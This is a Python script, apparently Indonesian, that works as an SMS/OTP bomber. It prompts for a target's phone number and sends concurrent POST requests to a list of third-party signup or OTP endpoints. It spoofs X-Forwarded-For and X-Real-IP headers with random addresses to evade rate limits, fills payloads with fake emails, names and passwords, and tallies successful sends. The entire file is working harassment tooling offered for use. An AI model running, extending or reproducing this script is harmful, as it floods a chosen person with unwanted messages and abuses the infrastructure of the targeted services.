#!/usr/bin/env python3
import requests
import uuid
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from targets import TARGETS
from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

UA = 'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36'

def normalize(phone):
    return re.sub(r'\D', '', str(phone))

def rand_email():
    return f"eterx{random.randint(1000,9999)}@gmail.com"

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def rand_hex(n=16):
    return uuid.uuid4().hex[:n]

def rand_name():
    return random.choice(['EterxUser','Bang Upil','BestFriend','AdminGanteng','UserV69'])

def rand_pw():
    return f"Eterx{random.randint(1000,9999)}!"

def replace_vars(payload, number, formatted):
    replacements = {
        '{number}': str(formatted),
        '{raw}': number,
        '{rand}': rand_hex(16),
        '{ip}': rand_ip(),
        '{email}': rand_email(),
        '{name}': rand_name(),
        '{pw}': rand_pw()
    }
    for k, v in replacements.items():
        payload = payload.replace(k, v)
    return payload

def attack_json(target, phone, delay=0.3):
    raw = normalize(phone)
    number_fmt = target.get('number_fmt', lambda p: p)
    try:
        formatted = number_fmt(raw)
        if isinstance(formatted, int):
            formatted = str(formatted)
    except Exception:
        formatted = raw

    url = target['url']
    payload = replace_vars(target['payload'], raw, formatted)
    referer = target.get('referer', '')
    headers = {
        'User-Agent': UA,
        'Referer': referer,
        'X-Forwarded-For': rand_ip(),
        'X-Real-IP': rand_ip(),
    }
    custom_headers = target.get('headers', {})
    headers.update(custom_headers)

    try:
        r = requests.post(url, data=payload, headers=headers, timeout=20)
        success_on = target.get('success_on', [])
        text = r.text.lower()
        ok = False
        if not success_on:
            ok = r.status_code < 500
        else:
            ok = any(s.lower() in text for s in success_on)
        status = 'SUKSES' if ok else 'GAGAL'
        print(f"[{status}] {target['name']:18} -> {raw:15} | HTTP {r.status_code} | Len {len(r.text)}")
        if delay:
            time.sleep(delay)
        return ok
    except Exception as e:
        print(f"[ERROR] {target['name']:18} -> {raw:15} | {str(e)[:60]}")
        return False

def attack_nonjson(target, phone):
    raw = normalize(phone)
    number_fmt = target.get('number_fmt', lambda p: p)
    try:
        formatted = number_fmt(raw)
    except Exception:
        formatted = raw
    print(f"[SKIP] {target['name']:18} -> {raw:15} | NON-JSON ENDPOINT BELUM DILENGKAPI DI SNIPPET")
    return False

def blast(phone, mode='json'):
    results = []
    targets = [t for t in TARGETS if t.get('post_type') == 'json'] if mode == 'json' else TARGETS
    print(f"\n[+] TARGET COUNT: {len(targets)} | PHONE: {normalize(phone)}\n")
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = []
        for t in targets:
            if t.get('post_type') == 'json':
                futures.append(ex.submit(attack_json, t, phone))
            else:
                futures.append(ex.submit(attack_nonjson, t, phone))
        for f in as_completed(futures):
            try:
                results.append(f.result())
            except Exception as e:
                print(f"[THREAD ERROR] {e}")
    print(f"\n[+] SELESAI | SUKSES: {results.count(True)} | GAGAL: {results.count(False)}")

if __name__ == '__main__':
    phone = input("MASUKIN NOMOR TARGET (08xxx / +62xxx): ").strip()
    mode = input("MODE (json/all): ").strip().lower() or 'json'
    blast(phone, mode)
